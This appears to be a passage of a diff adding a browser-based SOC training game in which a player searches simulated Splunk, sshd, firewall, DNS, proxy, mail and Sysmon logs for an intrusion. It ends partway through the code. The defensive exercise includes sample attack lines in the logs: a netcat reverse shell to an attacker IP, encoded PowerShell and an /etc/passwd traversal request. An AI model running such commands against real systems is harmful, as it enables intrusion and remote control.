@@ -1,0 +1,1557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOG-01: Signal in the Noise | Operator</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background: #0a0c10;
+            color: rgba(255,255,255,0.85);
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        /* CRT scanlines */
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0,0,0,0.1) 0px,
+                rgba(0,0,0,0.1) 1px,
+                transparent 1px,
+                transparent 3px
+            );
+            pointer-events: none;
+            z-index: 9000;
+        }
+
+        /* ─── Header ─── */
+        .mission-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+            background: #0e1018;
+            border-bottom: 1px solid rgba(57, 255, 20, 0.15);
+            height: 44px;
+            flex-shrink: 0;
+        }
+        .mission-header-back {
+            font-size: 0.75rem;
+            color: rgba(255,255,255,0.4);
+            text-decoration: none;
+            letter-spacing: 0.08em;
+            transition: color 0.2s;
+        }
+        .mission-header-back:hover { color: #39ff14; }
+        .mission-header-title {
+            font-size: 0.7rem;
+            letter-spacing: 0.15em;
+            color: #39ff14;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+        .mission-header-status {
+            font-size: 0.6rem;
+            letter-spacing: 0.12em;
+            color: rgba(57, 255, 20, 0.4);
+            text-transform: uppercase;
+        }
+
+        /* ─── Objectives Bar ─── */
+        .obj-bar {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 7px 20px;
+            background: #0c0e14;
+            border-bottom: 1px solid rgba(57, 255, 20, 0.1);
+            overflow-x: auto;
+            flex-shrink: 0;
+        }
+        .obj-label {
+            font-size: 0.55rem;
+            letter-spacing: 0.15em;
+            color: rgba(57, 255, 20, 0.3);
+            text-transform: uppercase;
+            white-space: nowrap;
+            margin-right: 4px;
+        }
+        .obj-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.6rem;
+            color: rgba(255, 255, 255, 0.25);
+            letter-spacing: 0.04em;
+            white-space: nowrap;
+            transition: color 0.3s;
+        }
+        .obj-item.complete { color: #39ff14; }
+        .obj-check {
+            width: 13px;
+            height: 13px;
+            border-radius: 3px;
+            border: 1px solid rgba(57, 255, 20, 0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.55rem;
+            flex-shrink: 0;
+            transition: all 0.3s;
+        }
+        .obj-item.complete .obj-check {
+            background: rgba(57, 255, 20, 0.15);
+            border-color: #39ff14;
+            color: #39ff14;
+        }
+
+        /* ─── Split Layout ─── */
+        .mission-layout {
+            display: flex;
+            height: calc(100vh - 44px - 30px);
+        }
+
+        /* ─── Map Panel (left 55%) ─── */
+        .map-panel {
+            flex: 0 0 55%;
+            position: relative;
+            overflow: hidden;
+            border-right: 1px solid rgba(57, 255, 20, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #090b0f;
+        }
+        .map-panel::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(57, 255, 20, 0.015) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(57, 255, 20, 0.015) 1px, transparent 1px);
+            background-size: 30px 30px;
+            pointer-events: none;
+        }
+
+        /* ─── Grid ─── */
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            grid-template-rows: repeat(4, 1fr);
+            gap: 4px;
+            padding: 20px;
+            width: 100%;
+            height: 100%;
+            max-width: 600px;
+            max-height: 480px;
+        }
+
+        .grid-cell {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(57, 255, 20, 0.06);
+            border-radius: 4px;
+            position: relative;
+            transition: all 0.4s ease;
+            min-height: 0;
+            overflow: hidden;
+        }
+
+        /* Cell visibility states */
+        .grid-cell.vis-hidden {
+            background: rgba(57, 255, 20, 0.01);
+            border-color: rgba(57, 255, 20, 0.04);
+        }
+        .grid-cell.vis-revealed {
+            background: rgba(57, 255, 20, 0.05);
+            border-color: rgba(57, 255, 20, 0.15);
+        }
+        .grid-cell.vis-visited {
+            background: rgba(57, 255, 20, 0.09);
+            border-color: rgba(57, 255, 20, 0.25);
+        }
+        .grid-cell.current {
+            background: rgba(57, 255, 20, 0.14);
+            border-color: #39ff14;
+            box-shadow: 0 0 12px rgba(57, 255, 20, 0.15), inset 0 0 8px rgba(57, 255, 20, 0.05);
+        }
+        .grid-cell.wall {
+            background: rgba(255, 255, 255, 0.015);
+            border-color: rgba(255, 255, 255, 0.03);
+        }
+        .grid-cell.empty-vis {
+            background: rgba(57, 255, 20, 0.03);
+        }
+
+        /* SIEM console accent — primary analysis hub gets a cyan left border when visible */
+        .grid-cell[data-type="siem-console"]:not(.vis-hidden):not(.wall) {
+            border-left: 2px solid rgba(0, 170, 255, 0.45);
+        }
+
+        /* Cell content */
+        .cell-icon {
+            font-size: 0.85rem;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            transition: color 0.3s;
+        }
+        .cell-label {
+            font-size: 0.5rem;
+            letter-spacing: 0.06em;
+            margin-top: 2px;
+            transition: color 0.3s;
+            text-align: center;
+        }
+        .vis-hidden .cell-icon { color: rgba(255, 255, 255, 0.06); }
+        .vis-hidden .cell-label { color: transparent; }
+        .vis-revealed .cell-icon { color: rgba(57, 255, 20, 0.45); }
+        .vis-revealed .cell-label { color: rgba(57, 255, 20, 0.2); }
+        .vis-visited .cell-icon { color: rgba(57, 255, 20, 0.7); }
+        .vis-visited .cell-label { color: rgba(57, 255, 20, 0.35); }
+        .current .cell-icon { color: #39ff14; }
+        .current .cell-label { color: rgba(57, 255, 20, 0.6); }
+        .wall .cell-icon { color: rgba(255, 255, 255, 0.04); }
+        .wall .cell-label { color: transparent; }
+
+        /* Agent dot */
+        .cell-agent {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #39ff14;
+            position: absolute;
+            bottom: 5px;
+            right: 5px;
+            animation: agentPulse 2s ease-in-out infinite;
+            box-shadow: 0 0 6px rgba(57, 255, 20, 0.5);
+        }
+        @keyframes agentPulse {
+            0%, 100% { box-shadow: 0 0 4px rgba(57, 255, 20, 0.3); transform: scale(1); }
+            50% { box-shadow: 0 0 12px rgba(57, 255, 20, 0.7), 0 0 20px rgba(57, 255, 20, 0.15); transform: scale(1.15); }
+        }
+
+        /* Cell reveal animation */
+        @keyframes cellReveal {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .grid-cell.just-revealed {
+            animation: cellReveal 0.4s ease-out;
+        }
+
+        /* ─── Terminal Panel (right 45%) ─── */
+        .term-panel {
+            flex: 0 0 45%;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            background: #080a0e;
+        }
+        .term-bar {
+            padding: 7px 14px;
+            background: #0c0e14;
+            border-bottom: 1px solid rgba(57, 255, 20, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-shrink: 0;
+        }
+        .term-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: rgba(57, 255, 20, 0.3);
+        }
+        .term-bar-label {
+            font-size: 0.55rem;
+            color: rgba(57, 255, 20, 0.35);
+            letter-spacing: 0.1em;
+            margin-left: 6px;
+        }
+        .term-output {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px 14px;
+            font-size: 0.78rem;
+            line-height: 1.65;
+        }
+        .term-output::-webkit-scrollbar { width: 4px; }
+        .term-output::-webkit-scrollbar-track { background: transparent; }
+        .term-output::-webkit-scrollbar-thumb { background: rgba(57, 255, 20, 0.15); border-radius: 2px; }
+
+        /* Terminal line types */
+        .term-line { word-break: break-word; }
+        .term-system { color: rgba(57, 255, 20, 0.3); }
+        .term-info { color: rgba(57, 255, 20, 0.65); }
+        .term-success { color: #39ff14; font-weight: 600; }
+        .term-error { color: #ff4444; }
+        .term-warning { color: #ffaa00; }
+        .term-node-info { color: #00ccff; }
+        .term-heading { color: #39ff14; font-weight: 700; }
+        .term-prompt-echo { color: rgba(57, 255, 20, 0.45); }
+
+        /* Terminal input */
+        .term-input-row {
+            display: flex;
+            align-items: center;
+            padding: 8px 14px;
+            border-top: 1px solid rgba(57, 255, 20, 0.1);
+            background: #0a0c12;
+            flex-shrink: 0;
+        }
+        .term-prompt-text {
+            color: #39ff14;
+            font-size: 0.78rem;
+            white-space: nowrap;
+            margin-right: 8px;
+        }
+        .term-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #76ff03;
+            font-family: 'Courier New', monospace;
+            font-size: 0.78rem;
+            caret-color: #39ff14;
+        }
+
+        /* ─── Mission Complete Overlay ─── */
+        .mission-complete {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.88);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 8000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.6s;
+        }
+        .mission-complete.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .mc-card {
+            background: #0e1018;
+            border: 1px solid rgba(57, 255, 20, 0.3);
+            border-radius: 8px;
+            padding: 36px 40px;
+            text-align: center;
+            max-width: 380px;
+            width: 90%;
+        }
+        .mc-badge {
+            font-size: 0.55rem;
+            letter-spacing: 0.2em;
+            color: rgba(57, 255, 20, 0.5);
+            text-transform: uppercase;
+            margin-bottom: 10px;
+        }
+        .mc-title {
+            font-size: 1.3rem;
+            color: #39ff14;
+            letter-spacing: 0.2em;
+            margin-bottom: 6px;
+            text-shadow: 0 0 20px rgba(57, 255, 20, 0.3);
+        }
+        .mc-subtitle {
+            font-size: 0.7rem;
+            color: rgba(255,255,255,0.35);
+            margin-bottom: 28px;
+        }
+        .mc-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+        .mc-stat-value {
+            font-size: 1.5rem;
+            color: #39ff14;
+            font-weight: 700;
+        }
+        .mc-stat-label {
+            font-size: 0.55rem;
+            color: rgba(255,255,255,0.25);
+            letter-spacing: 0.08em;
+            margin-top: 3px;
+            text-transform: uppercase;
+        }
+        .mc-btn {
+            display: inline-block;
+            padding: 10px 28px;
+            background: rgba(57, 255, 20, 0.1);
+            border: 1px solid rgba(57, 255, 20, 0.3);
+            border-radius: 4px;
+            color: #39ff14;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            letter-spacing: 0.12em;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .mc-btn:hover {
+            background: rgba(57, 255, 20, 0.2);
+            border-color: #39ff14;
+            box-shadow: 0 0 15px rgba(57, 255, 20, 0.15);
+        }
+
+        /* ─── Mobile ─── */
+        @media (max-width: 768px) {
+            .mission-layout {
+                flex-direction: column;
+            }
+            .map-panel {
+                flex: 0 0 42%;
+                border-right: none;
+                border-bottom: 1px solid rgba(57, 255, 20, 0.1);
+            }
+            .term-panel {
+                flex: 1;
+            }
+            .obj-bar { gap: 10px; padding: 6px 12px; }
+            .obj-item { font-size: 0.5rem; }
+            .obj-label { font-size: 0.5rem; }
+            .grid-container { padding: 10px; max-height: none; }
+        }
+        @media (max-width: 480px) {
+            .mission-header { padding: 8px 12px; height: 38px; }
+            .mission-header-title { font-size: 0.6rem; }
+            .mission-layout { height: calc(100vh - 38px - 26px); }
+            .cell-label { display: none; }
+            .cell-icon { font-size: 0.7rem; }
+            .cell-agent { width: 8px; height: 8px; bottom: 3px; right: 3px; }
+            .mc-card { padding: 24px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <div class="mission-header">
+        <a href="../index.html" class="mission-header-back">&larr; OPERATOR</a>
+        <div class="mission-header-title">LOG-01 / SIGNAL IN THE NOISE</div>
+        <div class="mission-header-status" id="header-status">IN PROGRESS</div>
+    </div>
+
+    <!-- Objectives bar -->
+    <div class="obj-bar">
+        <span class="obj-label">OBJ</span>
+        <div class="obj-item" id="obj-0">
+            <span class="obj-check"></span> Discover 5 log sources
+        </div>
+        <div class="obj-item" id="obj-1">
+            <span class="obj-check"></span> Find brute-force evidence
+        </div>
+        <div class="obj-item" id="obj-2">
+            <span class="obj-check"></span> Correlate lateral movement
+        </div>
+        <div class="obj-item" id="obj-3">
+            <span class="obj-check"></span> File detection alert
+        </div>
+    </div>
+
+    <!-- Split layout -->
+    <div class="mission-layout">
+        <!-- Left: Network Map -->
+        <div class="map-panel">
+            <div class="grid-container" id="grid-container"></div>
+        </div>
+
+        <!-- Right: Terminal -->
+        <div class="term-panel" id="term-panel">
+            <div class="term-bar">
+                <div class="term-dot"></div>
+                <div class="term-dot"></div>
+                <div class="term-dot"></div>
+                <span class="term-bar-label">OPERATOR TERMINAL</span>
+            </div>
+            <div class="term-output" id="term-output"></div>
+            <div class="term-input-row">
+                <span class="term-prompt-text">analyst@siem:~$</span>
+                <input type="text" class="term-input" id="term-input" autocomplete="off" spellcheck="false" autofocus>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mission Complete Overlay -->
+    <div class="mission-complete" id="mission-complete">
+        <div class="mc-card">
+            <div class="mc-badge">MISSION COMPLETE</div>
+            <div class="mc-title">SIGNAL IN THE NOISE</div>
+            <div class="mc-subtitle">Threat detected. Alert filed.</div>
+            <div class="mc-stats">
+                <div>
+                    <div class="mc-stat-value" id="stat-sources">0</div>
+                    <div class="mc-stat-label">Sources</div>
+                </div>
+                <div>
+                    <div class="mc-stat-value" id="stat-commands">0</div>
+                    <div class="mc-stat-label">Commands</div>
+                </div>
+                <div>
+                    <div class="mc-stat-value" id="stat-time">0s</div>
+                    <div class="mc-stat-label">Time</div>
+                </div>
+            </div>
+            <a href="../index.html" class="mc-btn">RETURN TO OPERATOR</a>
+        </div>
+    </div>
+
+<script>
+/* ═══════════════════════════════════════════════════════════
+   LOG-01: Signal in the Noise — Mission Engine
+   ═══════════════════════════════════════════════════════════ */
+
+// ─── Grid Map ───
+// Rows 0-3, Cols 0-4
+// 'empty' = traversable open space, 'wall' = impassable
+const GRID_MAP = [
+    ['siem-console', 'empty',        'web-logs',     'auth-logs',     'wall'],
+    ['empty',        'dns-logs',     'empty',        'firewall-logs', 'proxy-logs'],
+    ['wall',         'mail-logs',    'empty',        'empty',         'wall'],
+    ['wall',         'wall',         'endpoint-logs','wall',          'wall']
+];
+
+const ROWS = 4;
+const COLS = 5;
+
+// ─── Cell Info ───
+// Each log-source node has label, abbr (shown on map), ip, desc, os
+const CELL_INFO = {
+    'siem-console':   { label: 'SIEM',        abbr: 'SIEM', ip: '10.10.0.1',  desc: 'Splunk Enterprise Security \u2014 central log aggregation', os: 'Splunk ES 9.1' },
+    'web-logs':       { label: 'WEB-LOGS',    abbr: 'WEB',  ip: '10.10.1.10', desc: 'Apache access and error logs',                              os: 'Apache 2.4 / Ubuntu 22.04' },
+    'auth-logs':      { label: 'AUTH-LOGS',   abbr: 'AUTH', ip: '10.10.1.20', desc: 'PAM and sshd authentication logs',                          os: 'Ubuntu 22.04 LTS' },
+    'dns-logs':       { label: 'DNS-LOGS',    abbr: 'DNS',  ip: '10.10.2.5',  desc: 'DNS query and response logs',                               os: 'BIND 9.18' },
+    'firewall-logs':  { label: 'FW-LOGS',     abbr: 'FWL',  ip: '10.10.2.30', desc: 'pfSense firewall traffic logs',                             os: 'pfSense 2.7.0' },
+    'proxy-logs':     { label: 'PROXY-LOGS',  abbr: 'PRX',  ip: '10.10.2.40', desc: 'Squid proxy access logs',                                   os: 'Squid 5.7' },
+    'mail-logs':      { label: 'MAIL-LOGS',   abbr: 'MAIL', ip: '10.10.3.15', desc: 'Exchange mail transport logs',                              os: 'Exchange 2019' },
+    'endpoint-logs':  { label: 'ENDPOINT',    abbr: 'EPT',  ip: '10.10.3.50', desc: 'Sysmon and Windows Event logs',                             os: 'Windows 11 / Sysmon 15' }
+};
+
+// ─── Simulated log entries per node ───
+// Each node returns an array of realistic log lines for the `logs` command.
+const LOG_CONTENT = {
+    'siem-console': [
+        '[SIEM] 2024-11-14 02:14:08 | ALERT | HIGH   | auth-logs      | Brute force threshold exceeded: 10.10.5.77',
+        '[SIEM] 2024-11-14 02:11:33 | ALERT | MEDIUM | firewall-logs  | Port scan detected from 10.10.5.77',
+        '[SIEM] 2024-11-14 01:58:17 | ALERT | LOW    | web-logs       | HTTP 500 rate spike on /api/login',
+        '[SIEM] 2024-11-14 01:45:02 | ALERT | MEDIUM | dns-logs       | Query to uncategorized external domain',
+        '[SIEM] 2024-11-14 01:30:44 | ALERT | HIGH   | endpoint-logs  | Encoded PowerShell execution detected',
+        '[SIEM] --- 5 active alerts, 3 unacknowledged ---'
+    ],
+    'web-logs': [
+        '10.10.4.88 - - [14/Nov/2024:01:50:12 +0000] "GET /index.html HTTP/1.1" 200 4523',
+        '10.10.4.92 - - [14/Nov/2024:01:51:05 +0000] "POST /api/login HTTP/1.1" 500 312',
+        '10.10.4.92 - - [14/Nov/2024:01:51:06 +0000] "POST /api/login HTTP/1.1" 500 312',
+        '10.10.5.77 - - [14/Nov/2024:01:55:33 +0000] "GET /admin/config HTTP/1.1" 404 172',
+        '10.10.4.11 - - [14/Nov/2024:02:00:01 +0000] "GET /assets/logo.png HTTP/1.1" 200 18204',
+        '10.10.5.77 - - [14/Nov/2024:02:01:14 +0000] "GET /../../../etc/passwd HTTP/1.1" 400 0',
+        '[error] [pid 1234] mod_security: Rule 941100 triggered \u2014 XSS attempt from 10.10.5.77'
+    ],
+    'auth-logs': [
+        'Nov 14 02:08:01 srv01 sshd[4412]: Accepted publickey for devops from 10.10.4.55 port 52301',
+        'Nov 14 02:10:14 srv01 sshd[4501]: Failed password for root from 10.10.5.77 port 41022 ssh2',
+        'Nov 14 02:10:16 srv01 sshd[4502]: Failed password for root from 10.10.5.77 port 41088 ssh2',
+        'Nov 14 02:10:18 srv01 sshd[4503]: Failed password for root from 10.10.5.77 port 41133 ssh2',
+        'Nov 14 02:10:21 srv01 sshd[4504]: Failed password for root from 10.10.5.77 port 41204 ssh2',
+        'Nov 14 02:10:24 srv01 sshd[4505]: Failed password for admin from 10.10.5.77 port 41271 ssh2',
+        'Nov 14 02:10:27 srv01 sshd[4506]: Failed password for ubuntu from 10.10.5.77 port 41350 ssh2',
+        'Nov 14 02:14:07 srv01 sshd[4598]: PAM 6 more authentication failures; 10.10.5.77'
+    ],
+    'dns-logs': [
+        '14-Nov-2024 02:05:03.112 queries: client 10.10.4.88#55123: query: shop.internal A +',
+        '14-Nov-2024 02:07:44.008 queries: client 10.10.4.92#60012: query: api.internal A +',
+        '14-Nov-2024 02:09:31.774 queries: client 10.10.5.77#49881: query: c2.malware-domain.xyz A +',
+        '14-Nov-2024 02:09:31.901 queries: SERVFAIL c2.malware-domain.xyz \u2014 blocked by RPZ policy',
+        '14-Nov-2024 02:11:14.223 queries: client 10.10.4.11#53309: query: mail.internal MX +',
+        '14-Nov-2024 02:13:07.445 queries: client 10.10.5.77#50024: query: 203.0.113.44.in-addr.arpa PTR +'
+    ],
+    'firewall-logs': [
+        'Nov 14 02:08:12 pfsense filterlog: 4,16,8000,em0,match,block,in,4,0x0,,60,12345,0,DF,6,tcp,60,203.0.113.44,10.10.1.20,41022,22,0',
+        'Nov 14 02:10:14 pfsense filterlog: 4,16,8000,em0,match,pass,in,4,0x0,,64,12401,0,DF,6,tcp,64,10.10.5.77,10.10.1.20,41022,22,S',
+        'Nov 14 02:12:05 pfsense filterlog: 4,16,8000,em0,match,pass,in,4,0x0,,64,12688,0,DF,6,tcp,64,10.10.5.77,10.10.3.50,22,22,S',
+        'Nov 14 02:12:47 pfsense filterlog: 4,16,8000,em0,match,pass,in,4,0x0,,64,12801,0,DF,6,tcp,64,10.10.5.77,10.10.4.10,22,22,S',
+        'Nov 14 02:13:30 pfsense filterlog: 4,16,8000,em0,match,pass,in,4,0x0,,64,12950,0,DF,6,tcp,64,10.10.5.77,10.10.4.22,22,22,S',
+        '  [NOTE] 10.10.5.77 attempting SSH to multiple internal hosts \u2014 lateral movement pattern'
+    ],
+    'proxy-logs': [
+        '1699926014.441   1234 10.10.4.88 TCP_MISS/200 18432 GET http://updates.ubuntu.com/pool/main/ - DIRECT',
+        '1699926122.008    822 10.10.4.92 TCP_MISS/200  5120 GET http://api.github.com/repos/ - DIRECT',
+        '1699926355.771      0 10.10.5.77 TCP_DENIED/403    0 GET http://c2.malware-domain.xyz/ - DIRECT',
+        '1699926401.224   2001 10.10.4.11 TCP_MISS/200 92048 GET http://packages.microsoft.com/ - DIRECT',
+        '1699926503.889    441 10.10.5.77 TCP_DENIED/403    0 CONNECT pastebin.com:443 - DIRECT',
+        '  [POLICY] 2 requests from 10.10.5.77 denied by security policy'
+    ],
+    'mail-logs': [
+        '2024-11-14 01:45:03 SMTP: Message-ID=<msg001@corp.internal> from=hr@corp.internal to=all@corp.internal size=2048 status=Delivered',
+        '2024-11-14 01:52:17 SMTP: Message-ID=<phish992@unknown.xyz> from=noreply@helpdesk-corp.xyz to=cfo@corp.internal size=1240 status=Quarantined',
+        '2024-11-14 01:52:17 TRANSPORT: Attachment blocked \u2014 invoice_Q4.exe blocked by policy',
+        '2024-11-14 02:00:44 SMTP: Message-ID=<msg002@corp.internal> from=dev@corp.internal to=team@corp.internal size=512 status=Delivered',
+        '2024-11-14 02:05:09 SMTP: Message-ID=<msg003@corp.internal> from=soc@corp.internal to=all@corp.internal size=890 status=Delivered',
+        '  [WARN] Phishing attempt quarantined at 01:52 \u2014 sender domain helpdesk-corp.xyz not in allowlist'
+    ],
+    'endpoint-logs': [
+        '2024-11-14T02:14:01Z EventID=1 ProcessCreate Image=C:\\Windows\\System32\\cmd.exe ParentImage=C:\\Windows\\explorer.exe',
+        '2024-11-14T02:14:03Z EventID=1 ProcessCreate Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ParentImage=cmd.exe CommandLine="powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="',
+        '2024-11-14T02:14:04Z EventID=3 NetworkConnect SourceIp=10.10.3.50 DestinationIp=10.10.5.77 DestPort=4444 Protocol=tcp',
+        '2024-11-14T02:14:09Z EventID=11 FileCreate TargetFilename=C:\\Users\\Public\\nc.exe',
+        '2024-11-14T02:14:12Z EventID=1 ProcessCreate Image=C:\\Users\\Public\\nc.exe CommandLine="nc.exe -e cmd.exe 10.10.5.77 4444"',
+        '  [ALERT] Base64-encoded PowerShell + netcat execution \u2014 likely post-exploitation activity'
+    ]
+};
+
+// ─── Game State ───
+let STATE = {
+    position: { col: 0, row: 0 },
+    visibility: {},
+    objectives: [false, false, false, false],
+    nodesDiscovered: new Set(),
+    logsViewed: new Set(),
+    bruteForceFound: false,
+    lateralFound: false,
+    alertFiled: false,
+    commandCount: 0,
+    commandHistory: [],
+    historyIndex: -1,
+    startTime: Date.now(),
+    completed: false
+};
+
+// ─── Objective announcement labels ───
+const OBJ_LABELS = [
+    'LOG SOURCES DISCOVERED \u2014 5 log nodes visited',
+    'BRUTE FORCE EVIDENCE \u2014 attack pattern identified in auth logs',
+    'LATERAL MOVEMENT CORRELATED \u2014 attacker IP confirmed across sources',
+    'DETECTION ALERT FILED \u2014 threat documented in SIEM'
+];
+
+// ═══ Grid Rendering ═══
+
+function buildGrid() {
+    var container = document.getElementById('grid-container');
+    container.innerHTML = '';
+    for (var r = 0; r < ROWS; r++) {
+        for (var c = 0; c < COLS; c++) {
+            var cell = document.createElement('div');
+            cell.className = 'grid-cell';
+            cell.dataset.col = c;
+            cell.dataset.row = r;
+            cell.dataset.type = GRID_MAP[r][c];
+
+            var icon = document.createElement('div');
+            icon.className = 'cell-icon';
+
+            var label = document.createElement('div');
+            label.className = 'cell-label';
+
+            var agent = document.createElement('div');
+            agent.className = 'cell-agent';
+            agent.style.display = 'none';
+
+            cell.appendChild(icon);
+            cell.appendChild(label);
+            cell.appendChild(agent);
+            container.appendChild(cell);
+        }
+    }
+}
+
+function updateGrid() {
+    for (var r = 0; r < ROWS; r++) {
+        for (var c = 0; c < COLS; c++) {
+            var cell = document.querySelector('.grid-cell[data-col="' + c + '"][data-row="' + r + '"]');
+            if (!cell) continue;
+
+            var type = GRID_MAP[r][c];
+            var key = c + ',' + r;
+            var vis = STATE.visibility[key] || 'hidden';
+            var isCurrent = STATE.position.col === c && STATE.position.row === r;
+
+            // Reset classes
+            cell.className = 'grid-cell';
+            cell.dataset.col = c;
+            cell.dataset.row = r;
+            cell.dataset.type = type;
+
+            if (type === 'wall') {
+                cell.classList.add('wall');
+            } else if (isCurrent) {
+                cell.classList.add('current');
+            } else {
+                cell.classList.add('vis-' + vis);
+                if (type === 'empty' && vis !== 'hidden') cell.classList.add('empty-vis');
+            }
+
+            // Content
+            var iconEl = cell.querySelector('.cell-icon');
+            var labelEl = cell.querySelector('.cell-label');
+            var agentEl = cell.querySelector('.cell-agent');
+
+            if (type === 'wall') {
+                iconEl.textContent = '';
+                labelEl.textContent = '';
+            } else if (vis === 'hidden' && !isCurrent) {
+                iconEl.textContent = '?';
+                labelEl.textContent = '';
+            } else if (type === 'empty') {
+                iconEl.textContent = '\u00B7';
+                labelEl.textContent = '';
+            } else {
+                var info = CELL_INFO[type];
+                iconEl.textContent = info.abbr;
+                labelEl.textContent = (vis === 'visited' || isCurrent) ? info.label : '';
+            }
+
+            agentEl.style.display = isCurrent ? 'block' : 'none';
+        }
+    }
+}
+
+// ═══ Fog of War ═══
+
+function revealAdjacent(col, row) {
+    var dirs = [[0,-1],[0,1],[1,0],[-1,0]];
+    dirs.forEach(function(d) {
+        var nc = col + d[0];
+        var nr = row + d[1];
+        if (nc < 0 || nc >= COLS || nr < 0 || nr >= ROWS) return;
+        if (GRID_MAP[nr][nc] === 'wall') return;
+        var key = nc + ',' + nr;
+        if (!STATE.visibility[key] || STATE.visibility[key] === 'hidden') {
+            STATE.visibility[key] = 'revealed';
+            var cell = document.querySelector('.grid-cell[data-col="' + nc + '"][data-row="' + nr + '"]');
+            if (cell) {
+                cell.classList.add('just-revealed');
+                setTimeout(function() { cell.classList.remove('just-revealed'); }, 500);
+            }
+        }
+    });
+}
+
+// ═══ Terminal Output ═══
+
+function printLine(text, type) {
+    var output = document.getElementById('term-output');
+    var line = document.createElement('div');
+    line.className = 'term-line term-' + (type || 'system');
+    line.textContent = text;
+    output.appendChild(line);
+
+    // Cap at 300 lines to prevent memory bloat from log dumps
+    while (output.children.length > 300) {
+        output.removeChild(output.firstChild);
+    }
+    output.scrollTop = output.scrollHeight;
+}
+
+// ═══ Node Resolution ───
+// Resolves a user-typed name/abbr/IP to a node entry with position + visibility.
+
+function resolveNode(query) {
+    var q = query.toLowerCase();
+    var exact = [];
+    var partial = [];
+
+    for (var r = 0; r < ROWS; r++) {
+        for (var c = 0; c < COLS; c++) {
+            var type = GRID_MAP[r][c];
+            if (type === 'empty' || type === 'wall') continue;
+            var info = CELL_INFO[type];
+            var vis = STATE.visibility[c + ',' + r] || 'hidden';
+            var entry = { type: type, col: c, row: r, visibility: vis, info: info };
+
+            if (q === type || q === info.label.toLowerCase() || q === info.ip || q === info.abbr.toLowerCase()) {
+                exact.push(entry);
+            } else if (type.indexOf(q) !== -1 || info.label.toLowerCase().indexOf(q) !== -1) {
+                partial.push(entry);
+            }
+        }
+    }
+
+    var results = exact.length > 0 ? exact : partial;
+
+    if (results.length === 1) return results[0];
+    if (results.length > 1) {
+        printLine('Multiple matches. Be more specific:', 'warning');
+        results.forEach(function(m) {
+            printLine('  ' + m.info.label + ' (' + m.info.ip + ')', 'info');
+        });
+        return null;
+    }
+    return null;
+}
+
+// ═══ Command Handlers ═══
+
+function cmdHelp() {
+    printLine('', 'system');
+    printLine('\u2550\u2550\u2550 COMMAND REFERENCE \u2550\u2550\u2550', 'heading');
+    printLine('  scan                   Survey area, reveal adjacent log sources', 'info');
+    printLine('  move <dir>             Move analyst (north/south/east/west or n/s/e/w)', 'info');
+    printLine('  logs                   View log entries at current node', 'info');
+    printLine('  filter <keyword>       Search current node logs for a keyword', 'info');
+    printLine('  correlate <A> <B>      Cross-reference two visited log sources', 'info');
+    printLine('  alert <text>           File a detection alert with description', 'info');
+    printLine('  timeline               Show chronological evidence discovered', 'info');
+    printLine('  status                 Show position and objectives', 'info');
+    printLine('  help                   Show this reference', 'info');
+    printLine('  clear                  Clear terminal output', 'info');
+    printLine('', 'system');
+    printLine('Node names: siem-console, web-logs, auth-logs, dns-logs,', 'system');
+    printLine('            firewall-logs, proxy-logs, mail-logs, endpoint-logs', 'system');
+    printLine('Abbreviations also work: SIEM, WEB, AUTH, DNS, FWL, PRX, MAIL, EPT', 'system');
+}
+
+function cmdScan() {
+    var col = STATE.position.col;
+    var row = STATE.position.row;
+    var cellType = GRID_MAP[row][col];
+
+    printLine('Scanning area...', 'system');
+    printLine('', 'system');
+
+    if (cellType !== 'empty' && cellType !== 'wall') {
+        var cur = CELL_INFO[cellType];
+        printLine('Current: ' + cur.label + ' (' + cur.ip + ')', 'heading');
+        printLine(cur.desc, 'info');
+    } else {
+        printLine('Current: Clear path (no log source)', 'heading');
+    }
+
+    printLine('', 'system');
+    printLine('Adjacent:', 'heading');
+
+    var dirs = [
+        { name: 'North', dc: 0, dr: -1 },
+        { name: 'South', dc: 0, dr: 1 },
+        { name: 'East',  dc: 1, dr: 0 },
+        { name: 'West',  dc: -1, dr: 0 }
+    ];
+
+    dirs.forEach(function(d) {
+        var nc = col + d.dc;
+        var nr = row + d.dr;
